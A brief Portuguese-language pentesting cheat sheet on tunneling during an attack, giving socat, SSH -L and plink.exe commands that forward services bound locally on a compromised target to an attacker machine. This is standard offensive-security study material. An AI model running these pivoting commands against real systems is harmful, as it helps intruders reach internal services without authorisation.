# Tunneling  
É uma técnica de encapsulamento de pacotes utilizado em redes de computadores para transportar protocolos que muitas vezes não são compatíveis com aquela rede, fornecendo uma conexão eficiente e segura.  

Durante um ataque podemos utilizar o tunelamento para nos conectar a serviços na máquina do alvo que estão disponíveis apenas localmente.  

Verificar portas e serviços ativos:
```
netstat -nlpt
```
## Socat  
Na máquina atacante, utilize o socat para escutar uma porta e redirecionar os dados para outra.
```
socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr
```

Na máquina alvo inicie o redirecionamento do serviço rodando na porta 22 para a porta 8443 na maquina atacante:
```
socat TCP4:$LHOST:8443 TCP4:127.0.0.1:22
```

## SSH  
Para realizar a técnica de tunneling utilizando o SSH, acrescente a opção `-L` com a porta local que irá receber os dados, o IP do alvo e a porta do serviço que irá enviar os dados. 
```
ssh $USER@$RHOST -p $RPORT -i $PRIV_KEY -L $LPORT:$RHOST:RPORT
```

## Windows  

No Windows podemos utilizar o plink.exe para realizar o tunelamento de um serviço na máquina local do alvo.  
Para realizar o tunelamento devemos primeiro iniciar o serviço de SSH na máquina atacante, depois subir o plink.exe no alvo e realizar uma conexão via SSH com a máquina atacante.  
```
plink.exe -ssh -l $USER -pw $PASS -R $LHOST:$LPORT:127.0.0.1:$RPORT $LHOST
```

